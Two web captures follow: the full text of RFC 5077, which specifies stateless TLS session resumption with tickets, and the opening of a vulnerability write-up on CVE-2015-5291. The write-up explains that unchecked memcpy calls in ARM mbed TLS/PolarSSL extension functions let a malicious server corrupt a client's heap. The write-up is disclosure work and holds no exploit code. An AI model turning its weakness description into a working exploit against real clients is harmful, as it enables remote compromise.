=== Content from www.ietf.org_68426104_20250126_093433.html ===

Network Working Group J. Salowey
Request for Comments: 5077 H. Zhou
Obsoletes: 4507 Cisco Systems
Category: Standards Track P. Eronen
Nokia
H. Tschofenig
Nokia Siemens Networks
January 2008
Transport Layer Security (TLS) Session Resumption without
Server-Side State
Status of This Memo
This document specifies an Internet standards track protocol for the
Internet community, and requests discussion and suggestions for
improvements. Please refer to the current edition of the "Internet
Official Protocol Standards" (STD 1) for the standardization state
and status of this protocol. Distribution of this memo is unlimited.
Abstract
This document describes a mechanism that enables the Transport Layer
Security (TLS) server to resume sessions and avoid keeping per-client
session state. The TLS server encapsulates the session state into a
ticket and forwards it to the client. The client can subsequently
resume a session using the obtained ticket. This document obsoletes
RFC 4507.
Salowey, et al. Standards Track [Page 1]

RFC 5077 Stateless TLS Session Resumption January 2008
Table of Contents
1. Introduction . . . . . . . . . . . . . . . . . . . . . . . . . 3
2. Terminology . . . . . . . . . . . . . . . . . . . . . . . . . 3
3. Protocol . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
3.1. Overview . . . . . . . . . . . . . . . . . . . . . . . . . 4
3.2. SessionTicket TLS Extension . . . . . . . . . . . . . . . 7
3.3. NewSessionTicket Handshake Message . . . . . . . . . . . . 8
3.4. Interaction with TLS Session ID . . . . . . . . . . . . . 9
4. Recommended Ticket Construction . . . . . . . . . . . . . . . 10
5. Security Considerations . . . . . . . . . . . . . . . . . . . 12
5.1. Invalidating Sessions . . . . . . . . . . . . . . . . . . 12
5.2. Stolen Tickets . . . . . . . . . . . . . . . . . . . . . . 12
5.3. Forged Tickets . . . . . . . . . . . . . . . . . . . . . . 12
5.4. Denial of Service Attacks . . . . . . . . . . . . . . . . 12
5.5. Ticket Protection Key Management . . . . . . . . . . . . . 13
5.6. Ticket Lifetime . . . . . . . . . . . . . . . . . . . . . 13
5.7. Alternate Ticket Formats and Distribution Schemes . . . . 13
5.8. Identity Privacy, Anonymity, and Unlinkability . . . . . . 14
6. Acknowledgements . . . . . . . . . . . . . . . . . . . . . . . 14
7. IANA Considerations . . . . . . . . . . . . . . . . . . . . . 15
8. References . . . . . . . . . . . . . . . . . . . . . . . . . . 15
8.1. Normative References . . . . . . . . . . . . . . . . . . . 15
8.2. Informative References . . . . . . . . . . . . . . . . . . 15
Appendix A. Discussion of Changes to RFC 4507 . . . . . . . . . . 17
Salowey, et al. Standards Track [Page 2]

RFC 5077 Stateless TLS Session Resumption January 2008
1. Introduction
This document defines a way to resume a Transport Layer Security
(TLS) session without requiring session-specific state at the TLS
server. This mechanism may be used with any TLS ciphersuite. This
document applies to both TLS 1.0 defined in [RFC2246], and TLS 1.1
defined in [RFC4346]. The mechanism makes use of TLS extensions
defined in [RFC4366] and defines a new TLS message type.
This mechanism is useful in the following situations:
1. servers that handle a large number of transactions from different
users
2. servers that desire to cache sessions for a long time
3. ability to load balance requests across servers
4. embedded servers with little memory
This document obsoletes RFC 4507 [RFC4507] to correct an error in the
encoding that caused the specification to differ from deployed
implementations. At the time of this writing, there are no known
implementations that follow the encoding specified in RFC 4507. This
update to RFC 4507 aligns the document with currently deployed
implementations. More details of the change are given in Appendix A.
2. Terminology
Within this document, the term 'ticket' refers to a cryptographically
protected data structure that is created and consumed by the server
to rebuild session-specific state.
The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
"SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" in this
document are to be interpreted as described in [RFC2119].
3. Protocol
This specification describes a mechanism to distribute encrypted
session-state information to the client in the form of a ticket and a
mechanism to present the ticket back to the server. The ticket is
created by a TLS server and sent to a TLS client. The TLS client
presents the ticket to the TLS server to resume a session.
Implementations of this specification are expected to support both
mechanisms. Other specifications can take advantage of the session
tickets, perhaps specifying alternative means for distribution or
selection. For example, a separate specification may describe an
Salowey, et al. Standards Track [Page 3]

RFC 5077 Stateless TLS Session Resumption January 2008
alternate way to distribute a ticket and use the TLS extension in
this document to resume the session. This behavior is beyond the
scope of the document and would need to be described in a separate
specification.
3.1. Overview
The client indicates that it supports this mechanism by including a
SessionTicket TLS extension in the ClientHello message. The
extension will be empty if the client does not already possess a
ticket for the server. The server sends an empty SessionTicket
extension to indicate that it will send a new session ticket using
the NewSessionTicket handshake message. The extension is described
in Section 3.2.
If the server wants to use this mechanism, it stores its session
state (such as ciphersuite and master secret) to a ticket that is
encrypted and integrity-protected by a key known only to the server.
The ticket is distributed to the client using the NewSessionTicket
TLS handshake message described in Section 3.3. This message is sent
during the TLS handshake before the ChangeCipherSpec message, after
the server has successfully verified the client's Finished message.
Client Server
ClientHello
(empty SessionTicket extension)-------->
ServerHello
(empty SessionTicket extension)
Certificate\*
ServerKeyExchange\*
CertificateRequest\*
<-------- ServerHelloDone
Certificate\*
ClientKeyExchange
CertificateVerify\*
[ChangeCipherSpec]
Finished -------->
NewSessionTicket
[ChangeCipherSpec]
<-------- Finished
Application Data <-------> Application Data
Figure 1: Message Flow for Full Handshake Issuing New Session Ticket
Salowey, et al. Standards Track [Page 4]

RFC 5077 Stateless TLS Session Resumption January 2008
The client caches this ticket along with the master secret and other
parameters associated with the current session. When the client
wishes to resume the session, it includes the ticket in the
SessionTicket extension within the ClientHello message. Appendix A
provides a detailed description of the encoding of the extension and
changes from RFC 4507. The server then decrypts the received ticket,
verifies the ticket's validity, retrieves the session state from the
contents of the ticket, and uses this state to resume the session.
The interaction with the TLS Session ID is described in Section 3.4.
If the server successfully verifies the client's ticket, then it may
renew the ticket by including a NewSessionTicket handshake message
after the ServerHello.
Client Server
ClientHello
(SessionTicket extension) -------->
ServerHello
(empty SessionTicket extension)
NewSessionTicket
[ChangeCipherSpec]
<-------- Finished
[ChangeCipherSpec]
Finished -------->
Application Data <-------> Application Data
Figure 2: Message Flow for Abbreviated Handshake Using New Session
Ticket
A recommended ticket format is given in Section 4.
If the server cannot or does not want to honor the ticket, then it
can initiate a full handshake with the client.
In the case that the server does not wish to issue a new ticket at
this time, it just completes the handshake without including a
SessionTicket extension or NewSessionTicket handshake message. This
is shown below (this flow is identical to Figure 1 in RFC 4346,
except for the SessionTicket extension in the first message):
Salowey, et al. Standards Track [Page 5]

RFC 5077 Stateless TLS Session Resumption January 2008
Client Server
ClientHello
(SessionTicket extension) -------->
ServerHello
Certificate\*
ServerKeyExchange\*
CertificateRequest\*
<-------- ServerHelloDone
Certificate\*
ClientKeyExchange
CertificateVerify\*
[ChangeCipherSpec]
Finished -------->
[ChangeCipherSpec]
<-------- Finished
Application Data <-------> Application Data
Figure 3: Message Flow for Server Completing Full Handshake Without
Issuing New Session Ticket
It is also permissible to have an exchange similar to Figure 3 using
the abbreviated handshake defined in Figure 2 of RFC 4346, where the
client uses the SessionTicket extension to resume the session, but
the server does not wish to issue a new ticket, and therefore does
not send a SessionTicket extension.
If the server rejects the ticket, it may still wish to issue a new
ticket after performing the full handshake as shown below (this flow
is identical to Figure 1, except the SessionTicket extension in the
ClientHello is not empty):
Salowey, et al. Standards Track [Page 6]

RFC 5077 Stateless TLS Session Resumption January 2008
Client Server
ClientHello
(SessionTicket extension) -------->
ServerHello
(empty SessionTicket extension)
Certificate\*
ServerKeyExchange\*
CertificateRequest\*
<-------- ServerHelloDone
Certificate\*
ClientKeyExchange
CertificateVerify\*
[ChangeCipherSpec]
Finished -------->
NewSessionTicket
[ChangeCipherSpec]
<-------- Finished
Application Data <-------> Application Data
Figure 4: Message Flow for Server Rejecting Ticket, Performing Full
Handshake, and Issuing New Session Ticket
3.2. SessionTicket TLS Extension
The SessionTicket TLS extension is based on [RFC4366]. The format of
the ticket is an opaque structure used to carry session-specific
state information. This extension may be sent in the ClientHello and
ServerHello.
If the client possesses a ticket that it wants to use to resume a
session, then it includes the ticket in the SessionTicket extension
in the ClientHello. If the client does not have a ticket and is
prepared to receive one in the NewSessionTicket handshake message,
then it MUST include a zero-length ticket in the SessionTicket
extension. If the client is not prepared to receive a ticket in the
NewSessionTicket handshake message, then it MUST NOT include a
SessionTicket extension unless it is sending a non-empty ticket it
received through some other means from the server.
The server uses a zero-length SessionTicket extension to indicate to
the client that it will send a new session ticket using the
NewSessionTicket handshake message described in Section 3.3. The
server MUST send this extension in the ServerHello if it wishes to
issue a new ticket to the client using the NewSessionTicket handshake
message. The server MUST NOT send this extension if it does not
receive one in the ClientHello.
Salowey, et al. Standards Track [Page 7]

RFC 5077 Stateless TLS Session Resumption January 2008
If the server fails to verify the ticket, then it falls back to
performing a full handshake. If the ticket is accepted by the server
but the handshake fails, the client SHOULD delete the ticket.
The SessionTicket extension has been assigned the number 35. The
extension\_data field of SessionTicket extension contains the ticket.
3.3. NewSessionTicket Handshake Message
This message is sent by the server during the TLS handshake before
the ChangeCipherSpec message. This message MUST be sent if the
server included a SessionTicket extension in the ServerHello. This
message MUST NOT be sent if the server did not include a
SessionTicket extension in the ServerHello. This message is included
in the hash used to create and verify the Finished message. In the
case of a full handshake, the server MUST verify the client's
Finished message before sending the ticket. The client MUST NOT
treat the ticket as valid until it has verified the server's Finished
message. If the server determines that it does not want to include a
ticket after it has included the SessionTicket extension in the
ServerHello, then it sends a zero-length ticket in the
NewSessionTicket handshake message.
If the server successfully verifies the client's ticket, then it MAY
renew the ticket by including a NewSessionTicket handshake message
after the ServerHello in the abbreviated handshake. The client
should start using the new ticket as soon as possible after it
verifies the server's Finished message for new connections. Note
that since the updated ticket is issued before the handshake
completes, it is possible that the client may not put the new ticket
into use before it initiates new connections. The server MUST NOT
assume that the client actually received the updated ticket until it
successfully verifies the client's Finished message.
The NewSessionTicket handshake message has been assigned the number 4
and its definition is given at the end of this section. The
ticket\_lifetime\_hint field contains a hint from the server about how
long the ticket should be stored. The value indicates the lifetime
in seconds as a 32-bit unsigned integer in network byte order
relative to when the ticket is received. A value of zero is reserved
to indicate that the lifetime of the ticket is unspecified. A client
SHOULD delete the ticket and associated state when the time expires.
It MAY delete the ticket earlier based on local policy. A server MAY
treat a ticket as valid for a shorter or longer period of time than
what is stated in the ticket\_lifetime\_hint.
Salowey, et al. Standards Track [Page 8]

RFC 5077 Stateless TLS Session Resumption January 2008
struct {
HandshakeType msg\_type;
uint24 length;
select (HandshakeType) {
case hello\_request: HelloRequest;
case client\_hello: ClientHello;
case server\_hello: ServerHello;
case certificate: Certificate;
case server\_key\_exchange: ServerKeyExchange;
case certificate\_request: CertificateRequest;
case server\_hello\_done: ServerHelloDone;
case certificate\_verify: CertificateVerify;
case client\_key\_exchange: ClientKeyExchange;
case finished: Finished;
case session\_ticket: NewSessionTicket; /\* NEW \*/
} body;
} Handshake;
struct {
uint32 ticket\_lifetime\_hint;
opaque ticket<0..2^16-1>;
} NewSessionTicket;
3.4. Interaction with TLS Session ID
If a server is planning on issuing a session ticket to a client that
does not present one, it SHOULD include an empty Session ID in the
ServerHello. If the server rejects the ticket and falls back to the
full handshake then it may include a non-empty Session ID to indicate
its support for stateful session resumption. If the client receives
a session ticket from the server, then it discards any Session ID
that was sent in the ServerHello.
When presenting a ticket, the client MAY generate and include a
Session ID in the TLS ClientHello. If the server accepts the ticket
and the Session ID is not empty, then it MUST respond with the same
Session ID present in the ClientHello. This allows the client to
easily differentiate when the server is resuming a session from when
it is falling back to a full handshake. Since the client generates a
Session ID, the server MUST NOT rely upon the Session ID having a
particular value when validating the ticket. If a ticket is
presented by the client, the server MUST NOT attempt to use the
Session ID in the ClientHello for stateful session resumption.
Alternatively, the client MAY include an empty Session ID in the
ClientHello. In this case, the client ignores the Session ID sent in
the ServerHello and determines if the server is resuming a session by
the subsequent handshake messages.
Salowey, et al. Standards Track [Page 9]

RFC 5077 Stateless TLS Session Resumption January 2008
4. Recommended Ticket Construction
This section describes a recommended format and protection for the
ticket. Note that the ticket is opaque to the client, so the
structure is not subject to interoperability concerns, and
implementations may diverge from this format. If implementations do
diverge from this format, they must take security concerns seriously.
Clients MUST NOT examine the ticket under the assumption that it
complies with this document.
The server uses two different keys: one 128-bit key for Advanced
Encryption Standard (AES) [AES] in Cipher Block Chaining (CBC) mode
[CBC] encryption and one 256-bit key for HMAC-SHA-256 [RFC4634].
The ticket is structured as follows:
struct {
opaque key\_name[16];
opaque iv[16];
opaque encrypted\_state<0..2^16-1>;
opaque mac[32];
} ticket;
Here, key\_name serves to identify a particular set of keys used to
protect the ticket. It enables the server to easily recognize
tickets it has issued. The key\_name should be randomly generated to
avoid collisions between servers. One possibility is to generate new
random keys and key\_name every time the server is started.
The actual state information in encrypted\_state is encrypted using
128-bit AES in CBC mode with the given IV. The Message
Authentication Code (MAC) is calculated using HMAC-SHA-256 over
key\_name (16 octets) and IV (16 octets), followed by the length of
the encrypted\_state field (2 octets) and its contents (variable
length).
Salowey, et al. Standards Track [Page 10]

RFC 5077 Stateless TLS Session Resumption January 2008
struct {
ProtocolVersion protocol\_version;
CipherSuite cipher\_suite;
CompressionMethod compression\_method;
opaque master\_secret[48];
ClientIdentity client\_identity;
uint32 timestamp;
} StatePlaintext;
enum {
anonymous(0),
certificate\_based(1),
psk(2)
} ClientAuthenticationType;
struct {
ClientAuthenticationType client\_authentication\_type;
select (ClientAuthenticationType) {
case anonymous: struct {};
case certificate\_based:
ASN.1Cert certificate\_list<0..2^24-1>;
case psk:
opaque psk\_identity<0..2^16-1>; /\* from [RFC4279] \*/
};
} ClientIdentity;
The structure StatePlaintext stores the TLS session state including
the master\_secret. The timestamp within this structure allows the
TLS server to expire tickets. To cover the authentication and key
exchange protocols provided by TLS, the ClientIdentity structure
contains the authentication type of the client used in the initial
exchange (see ClientAuthenticationType). To offer the TLS server
with the same capabilities for authentication and authorization, a
certificate list is included in case of public-key-based
authentication. The TLS server is therefore able to inspect a number
of different attributes within these certificates. A specific
implementation might choose to store a subset of this information or
additional information. Other authentication mechanisms, such as
Kerberos [RFC2712], would require different client identity data.
Other TLS extensions may require the inclusion of additional data in
the StatePlaintext structure.
Salowey, et al. Standards Track [Page 11]

RFC 5077 Stateless TLS Session Resumption January 2008
5. Security Considerations
This section addresses security issues related to the usage of a
ticket. Tickets must be authenticated and encrypted to prevent
modification or eavesdropping by an attacker. Several attacks
described below will be possible if this is not carefully done.
Implementations should take care to ensure that the processing of
tickets does not increase the chance of denial of service as
described below.
5.1. Invalidating Sessions
The TLS specification requires that TLS sessions be invalidated when
errors occur. [CSSC] discusses the security implications of this in
detail. In the analysis within this paper, failure to invalidate
sessions does not pose a security risk. This is because the TLS
handshake uses a non-reversible function to derive keys for a session
so information about one session does not provide an advantage to
attack the master secret or a different session. If a session
invalidation scheme is used, the implementation should verify the
integrity of the ticket before using the contents to invalidate a
session to ensure that an attacker cannot invalidate a chosen
session.
5.2. Stolen Tickets
An eavesdropper or man-in-the-middle may obtain the ticket and
attempt to use it to establish a session with the server; however,
since the ticket is encrypted and the attacker does not know the
secret key, a stolen ticket does not help an attacker resume a
session. A TLS server MUST use strong encryption and integrity
protection for the ticket to prevent an attacker from using a brute
force mechanism to obtain the ticket's contents.
5.3. Forged Tickets
A malicious user could forge or alter a ticket in order to resume a
session, to extend its lifetime, to impersonate another user, or to
gain additional privileges. This attack is not possible if the
ticket is protected using a strong integrity protection algorithm
such as a keyed HMAC-SHA-256.
5.4. Denial of Service Attacks
The key\_name field defined in the recommended ticket format helps the
server efficiently reject tickets that it did not issue. However, an
adversary could store or generate a large number of tickets to send
Salowey, et al. Standards Track [Page 12]

RFC 5077 Stateless TLS Session Resumption January 2008
to the TLS server for verification. To minimize the possibility of a
denial of service, the verification of the ticket should be
lightweight (e.g., using efficient symmetric key cryptographic
algorithms).
5.5. Ticket Protection Key Management
A full description of the management of the keys used to protect the
ticket is beyond the scope of this document. A list of RECOMMENDED
practices is given below.
o The keys should be generated securely following the randomness
recommendations in [RFC4086].
o The keys and cryptographic protection algorithms should be at
least 128 bits in strength. Some ciphersuites and applications
may require cryptographic protection greater than 128 bits in
strength.
o The keys should not be used for any purpose other than generating
and verifying tickets.
o The keys should be changed regularly.
o The keys should be changed if the ticket format or cryptographic
protection algorithms change.
5.6. Ticket Lifetime
The TLS server controls the lifetime of the ticket. Servers
determine the acceptable lifetime based on the operational and
security requirements of the environments in which they are deployed.
The ticket lifetime may be longer than the 24-hour lifetime
recommended in [RFC4346]. TLS clients may be given a hint of the
lifetime of the ticket. Since the lifetime of a ticket may be
unspecified, a client has its own local policy that determines when
it discards tickets.
5.7. Alternate Ticket Formats and Distribution Schemes
If the ticket format or distribution scheme defined in this document
is not used, then great care must be taken in analyzing the security
of the solution. In particular, if confidential information, such as
a secret key, is transferred to the client, it MUST be done using
secure communication so as to prevent attackers from obtaining or
modifying the key. Also, the ticket MUST have its integrity and
confidentiality protected with strong cryptographic techniques to
prevent a breach in the security of the system.
Salowey, et al. Standards Track [Page 13]

RFC 5077 Stateless TLS Session Resumption January 2008
5.8. Identity Privacy, Anonymity, and Unlinkability
This document mandates that the content of the ticket is
confidentiality protected in order to avoid leakage of its content,
such as user-relevant information. As such, it prevents disclosure
of potentially sensitive information carried within the ticket.
The initial handshake exchange, which was used to obtain the ticket,
might not provide identity confidentiality of the client based on the
properties of TLS. Another relevant security threat is the ability
for an on-path adversary to observe multiple TLS handshakes where the
same ticket is used, therefore concluding they belong to the same
communication endpoints. Application designers that use the ticket
mechanism described in this document should consider that
unlinkability [ANON] is not necessarily provided.
While a full discussion of these topics is beyond the scope of this
document, it should be noted that it is possible to issue a ticket
using a TLS renegotiation handshake that occurs after a secure tunnel
has been established by a previous handshake. This may help address
some privacy and unlinkability issues in some environments.
6. Acknowledgements
The authors would like to thank the following people for their help
with preparing and reviewing this document: Eric Rescorla, Mohamad
Badra, Tim Dierks, Nelson Bolyard, Nancy Cam-Winget, David McGrew,
Rob Dugal, Russ Housley, Amir Herzberg, Bernard Aboba, and members of
the TLS working group.
[CSSC] describes a solution that is very similar to the one described
in this document and gives a detailed analysis of the security
considerations involved. [RFC2712] describes a mechanism for using
Kerberos [RFC4120] in TLS ciphersuites, which helped inspire the use
of tickets to avoid server state. [RFC4851] makes use of a similar
mechanism to avoid maintaining server state for the cryptographic
tunnel. [SC97] also investigates the concept of stateless sessions.
The authors would also like to thank Jan Nordqvist, who found the
encoding error in RFC 4507, corrected by this document. In addition
Nagendra Modadugu, Wan-Teh Chang, and Michael D'Errico provided
useful feedback during the review of this document.
Salowey, et al. Standards Track [Page 14]

RFC 5077 Stateless TLS Session Resumption January 2008
7. IANA Considerations
IANA has assigned a TLS extension number of 35 to the SessionTicket
TLS extension from the TLS registry of ExtensionType values defined
in [RFC4366].
IANA has assigned a TLS HandshakeType number 4 to the
NewSessionTicket handshake type from the TLS registry of
HandshakeType values defined in [RFC4346].
This document does not require any actions or assignments from IANA.
8. References
8.1. Normative References
[RFC2119] Bradner, S., "Key words for use in RFCs to Indicate
Requirement Levels", BCP 14, RFC 2119, March 1997.
[RFC2246] Dierks, T. and C. Allen, "The TLS Protocol Version 1.0",
RFC 2246, January 1999.
[RFC4346] Dierks, T. and E. Rescorla, "The Transport Layer Security
(TLS) Protocol Version 1.1", RFC 4346, April 2006.
[RFC4366] Blake-Wilson, S., Nystrom, M., Hopwood, D., Mikkelsen, J.,
and T. Wright, "Transport Layer Security (TLS)
Extensions", RFC 4366, April 2006.
[RFC4507] Salowey, J., Zhou, H., Eronen, P., and H. Tschofenig,
"Transport Layer Security (TLS) Session Resumption without
Server-Side State", RFC 4507, May 2006.
8.2. Informative References
[AES] National Institute of Standards and Technology, "Advanced
Encryption Standard (AES)", Federal Information Processing
Standards (FIPS) Publication 197, November 2001.
[ANON] Pfitzmann, A. and M. Hansen, "Anonymity, Unlinkability,
Unobservability, Pseudonymity, and Identity Management - A
Consolidated Proposal for Terminology", http://
dud.inf.tu-dresden.de/literatur/
Anon\_Terminology\_v0.26-1.pdf Version 0.26, December 2005.
Salowey, et al. Standards Track [Page 15]

RFC 5077 Stateless TLS Session Resumption January 2008
[CBC] National Institute of Standards and Technology,
"Recommendation for Block Cipher Modes of Operation -
Methods and Techniques", NIST Special Publication 800-38A,
December 2001.
[CSSC] Shacham, H., Boneh, D., and E. Rescorla, "Client-side
caching for TLS", Transactions on Information and System
Security (TISSEC) , Volume 7, Issue 4, November 2004.
[RFC2712] Medvinsky, A. and M. Hur, "Addition of Kerberos Cipher
Suites to Transport Layer Security (TLS)", RFC 2712,
October 1999.
[RFC4086] Eastlake, D., Schiller, J., and S. Crocker, "Randomness
Requirements for Security", BCP 106, RFC 4086, June 2005.
[RFC4120] Neuman, C., Yu, T., Hartman, S., and K. Raeburn, "The
Kerberos Network Authentication Service (V5)", RFC 4120,
July 2005.
[RFC4279] Eronen, P. and H. Tschofenig, "Pre-Shared Key Ciphersuites
for Transport Layer Security (TLS)", RFC 4279,
December 2005.
[RFC4634] Eastlake, D. and T. Hansen, "US Secure Hash Algorithms
(SHA and HMAC-SHA)", RFC 4634, July 2006.
[RFC4851] Cam-Winget, N., McGrew, D., Salowey, J., and H. Zhou, "The
Flexible Authentication via Secure Tunneling Extensible
Authentication Protocol Method (EAP-FAST)", RFC 4851,
May 2007.
[SC97] Aura, T. and P. Nikander, "Stateless Connections",
Proceedings of the First International Conference on
Information and Communication Security (ICICS '97) , 1997.
Salowey, et al. Standards Track [Page 16]

RFC 5077 Stateless TLS Session Resumption January 2008
Appendix A. Discussion of Changes to RFC 4507
RFC 4507 [RFC4507] defines a mechanism to resume a TLS session
without maintaining server side state by specifying an encrypted
ticket that is maintained on the client. The client presents this
ticket to the server in a SessionTicket hello extension. The
encoding in RFC 4507 used the XDR style encoding specified in TLS
[RFC4346].
An error in the encoding caused the specification to differ from
deployed implementations. At the time of this writing there are no
known implementations that follow the encoding specified in RFC 4507.
This update to RFC 4507 aligns the document with these currently
deployed implementations.
Erroneous encoding in RFC 4507 resulted in two length fields; one for
the extension contents and one for the ticket itself. Hence, for a
ticket that is 256 bytes long and begins with the hex value FF FF,
the encoding of the extension would be as follows according to RFC
4507:
00 23 Ticket Extension type 35
01 02 Length of extension contents
01 00 Length of ticket
FF FF .. .. Actual ticket
The update proposed in this document reflects what implementations
actually encode, namely it removes the redundant length field. So,
for a ticket that is 256 bytes long and begins with the hex value FF
FF, the encoding of the extension would be as follows according to
this update:
00 23 Extension type 35
01 00 Length of extension contents (ticket)
FF FF .. .. Actual ticket
A server implemented according to RFC 4507 receiving a ticket
extension from a client conforming to this document would interpret
the first two bytes of the ticket as the length of this ticket. This
will result in either an inconsistent length field or in the
processing of a ticket missing the first two bytes. In the first
case, the server should reject the request based on a malformed
length. In the second case, the server should reject the ticket
based on a malformed ticket, incorrect key version, or failed
decryption. A server implementation based on this update receiving
an RFC 4507 extension would interpret the first length field as the
Salowey, et al. Standards Track [Page 17]

RFC 5077 Stateless TLS Session Resumption January 2008
length of the ticket and include the second two length bytes as the
first bytes in the ticket, resulting in the ticket being rejected
based on a malformed ticket, incorrect key version, or failed
decryption.
Note that the encoding of an empty SessionTicket extension was
ambiguous in RFC 4507. An RFC 4507 implementation may have encoded
it as:
00 23 Extension type 35
00 02 Length of extension contents
00 00 Length of ticket
or it may have encoded it the same way as this update:
00 23 Extension type 35
00 00 Length of extension contents
A server wishing to support RFC 4507 clients should respond to an
empty SessionTicket extension encoded the same way as it received it.
A server implementation can construct tickets such that it can detect
an RFC 4507 implementation, if one existed, by including a cookie at
the beginning of the tickets that can be differentiated from a valid
length. For example, if an implementation constructed tickets to
start with the hex values FF FF, then it could determine where the
ticket begins and determine the length correctly from the type of
length fields present.
This document makes a few additional changes to RFC 4507 listed
below.
o Clarifying that the server can allow session resumption using a
ticket without issuing a new ticket in Section 3.1.
o Clarifying that the lifetime is relative to when the ticket is
received in section 3.3.
o Clarifying that the NewSessionTicket handshake message is included
in the hash generated for the Finished messages in Section 3.3.
o Clarifying the interaction with TLS Session ID in Section 3.4.
o Recommending the use of SHA-256 for the integrity protection of
the ticket in Section 4.
o Clarifying that additional data can be included in the
StatePlaintext structure in Section 4.
Salowey, et al. Standards Track [Page 18]

RFC 5077 Stateless TLS Session Resumption January 2008
Authors' Addresses
Joseph Salowey
Cisco Systems
2901 3rd Ave
Seattle, WA 98121
US
EMail: jsalowey@cisco.com
Hao Zhou
Cisco Systems
4125 Highlander Parkway
Richfield, OH 44286
US
EMail: hzhou@cisco.com
Pasi Eronen
Nokia Research Center
P.O. Box 407
FIN-00045 Nokia Group
Finland
EMail: pasi.eronen@nokia.com
Hannes Tschofenig
Nokia Siemens Networks
Otto-Hahn-Ring 6
Munich, Bayern 81739
Germany
EMail: Hannes.Tschofenig@nsn.com
Salowey, et al. Standards Track [Page 19]

RFC 5077 Stateless TLS Session Resumption January 2008
Full Copyright Statement
Copyright (C) The IETF Trust (2008).
This document is subject to the rights, licenses and restrictions
contained in BCP 78, and except as set forth therein, the authors
retain all their rights.
This document and the information contained herein are provided on an
"AS IS" basis and THE CONTRIBUTOR, THE ORGANIZATION HE/SHE REPRESENTS
OR IS SPONSORED BY (IF ANY), THE INTERNET SOCIETY, THE IETF TRUST AND
THE INTERNET ENGINEERING TASK FORCE DISCLAIM ALL WARRANTIES, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO ANY WARRANTY THAT THE USE OF
THE INFORMATION HEREIN WILL NOT INFRINGE ANY RIGHTS OR ANY IMPLIED
WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.
Intellectual Property
The IETF takes no position regarding the validity or scope of any
Intellectual Property Rights or other rights that might be claimed to
pertain to the implementation or use of the technology described in
this document or the extent to which any license under such rights
might or might not be available; nor does it represent that it has
made any independent effort to identify any such rights. Information
on the procedures with respect to rights in RFC documents can be
found in BCP 78 and BCP 79.
Copies of IPR disclosures made to the IETF Secretariat and any
assurances of licenses to be made available, or the result of an
attempt made to obtain a general license or permission for the use of
such proprietary rights by implementers or users of this
specification can be obtained from the IETF on-line IPR repository at
http://www.ietf.org/ipr.
The IETF invites any interested party to bring to its attention any
copyrights, patents or patent applications, or other proprietary
rights that may cover technology that may be required to implement
this standard. Please address the information to the IETF at
ietf-ipr@ietf.org.
Salowey, et al. Standards Track [Page 20]



=== Content from guidovranken.files.wordpress.com_c446e689_20250125_143421.html ===
CVE-2015-5291

Remote heap corruption in ARM mbed TLS / PolarSSL

By Guido Vranken <guidovranken@gmail.com>

Introduction

This document elaborates on the general mechanism employed by ARM mbed TLS / PolarSSL in its set
of functions that handle the TLS extensions1 supported by the library, and how this mechanism
possesses an inherent weakness. The weakness under consideration here revolves around the lack of
bound checking by extension functions; as they are writing their data into the output buffer bound for
the remote end, they fail to verify that the amount of data they are copying (usually via memcpy) does
not exceed the space left in the output buffer, whose total size is just 16 kilobytes in the library's default
configuration, which is (usually) sufficient for normal use but is prone to heap corruption if either
unorthodox use of the library or malice enter the picture.

One particular TLS extension supported and handled by the library, namely the TLS Session Tickets2
extension, enables a malicious server to exploit this weakness remotely in its victim (the client
connected to it), which has led to the allocation of CVE-2015-52913 and the issuance of a security
advisory by the mbed TLS team.

Rather than focusing on the remote vulnerability alone, this document elaborates on all functions that
are affected the weakness in the mechanism, as they can all contribute to the viability of remote
exploitation as long as an attacker is able to influence their parameters. Similarly, while the ticket
extension is de facto the only extension whose weakness can be triggered at the behest of the remote
end while using the library's stock configuration, some of the other functions are prone to the same
weakness if the parent application which embeds the library allows more extensive parameterization by
remote ends.

TLS Extensions
During the TLS handshake, data chunks belonging to various enabled TLS extensions are included in
the outbound ClientHello and ServerHello data structures.

RFC 52464 defines these structures as follows:

1
2
3
4

https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml
https://www.ietf.org/rfc/rfc5077.txt
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5291
https://tools.ietf.org/html/rfc5246

struct {
  ProtocolVersion client_version;
  Random random;
  SessionID session_id;
  CipherSuite cipher_suites<2..2^16-2>;
  CompressionMethod compression_methods<1..2^8-1>;
  select (extensions_present) {
      case false:
          struct {};
      case true:
          Extension extensions<0..2^16-1>;
  };
} ClientHello;

struct {
  ProtocolVersion server_version;
  Random random;
  SessionID session_id;
  CipherSuite cipher_suite;
  CompressionMethod compression_method;
  select (extensions_present) {
      case false:
          struct {};
      case true:
          Extension extensions<0..2^16-1>;
  };
} ServerHello;

The Extension structure is defined as follows:

struct {
  ExtensionType extension_type;
  opaque extension_data<0..2^16-1>;
} Extension;

TLS extensions in the library's client code

Extension implementations

What follows is a list of functions invoked by the client which write extension data for each enabled
extension into the output buffer.

All these functions have the same format:

The first parameter is the current SSL context.

The second parameter is the start of the area that may be written by the extension function.

The third parameter is a pointer to the variable that will receive the total amount of bytes written by the
extension function.

static void ssl_write_hostname_ext( mbedtls_ssl_context *ssl, unsigned char
*buf, size_t *olen )
static void ssl_write_renegotiation_ext( mbedtls_ssl_context *ssl, unsigned
char *buf, size_t *olen )
static void ssl_write_signature_algorithms_ext( mbedtls_ssl_context *ssl,
unsigned char *buf, size_t *olen )
static void ssl_write_supported_elliptic_curves_ext( mbedtls_ssl_context
*ssl, unsigned char *buf, size_t *olen )
static void ssl_write_supported_point_formats_ext( mbedtls_ssl_context *ssl,
unsigned char *buf, size_t *olen )
static void ssl_write_max_fragment_length_ext( mbedtls_ssl_context *ssl,
unsigned char *buf, size_t *olen )
static void ssl_write_truncated_hmac_ext( mbedtls_ssl_context *ssl, unsigned
char *buf, size_t *olen )
static void ssl_write_encrypt_then_mac_ext( mbedtls_ssl_context *ssl,
unsigned char *buf, size_t *olen )
static void ssl_write_extended_ms_ext( mbedtls_ssl_context *ssl, unsigned
char *buf, size_t *olen )
static void ssl_write_session_ticket_ext( mbedtls_ssl_context *ssl, unsigned
char *buf, size_t *olen )
static void ssl_write_alpn_ext( mbedtls_ssl_context *ssl, unsigned char *buf,
size_t *olen )

